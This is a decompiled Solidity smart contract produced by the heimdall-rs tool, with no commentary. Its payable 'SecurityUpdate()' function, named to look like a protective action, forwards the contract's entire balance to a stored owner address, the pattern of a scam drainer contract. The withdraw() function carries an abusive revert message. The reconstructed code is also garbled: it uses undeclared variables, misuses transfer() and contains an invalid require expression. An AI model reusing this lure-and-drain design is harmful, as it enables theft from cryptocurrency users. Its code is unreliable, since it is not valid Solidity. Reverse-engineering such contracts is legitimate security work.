// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.0
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    bytes32 store_a;
    
    
    /// @custom:selector    0x3ccfd60b
    /// @custom:signature   withdraw() public payable
    function withdraw() public payable {
        require(address(msg.sender) == (address(store_a / 0x01)), "Bro? Are you a stupid idiot?");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x1c;
        var_e = 0x42726f3f2041726520796f75206120737475706964206964696f743f00000000;
        (bool success, bytes memory ret0) = address(msg.sender).transfer(address(this).balance);
    }
    
    /// @custom:selector    0x5fba79f5
    /// @custom:signature   SecurityUpdate() public payable
    function SecurityUpdate() public payable {
        require(!msg.value > 0);
        (bool success, bytes memory ret0) = address(store_a / 0x01).transfer(address(this).balance);
    }
}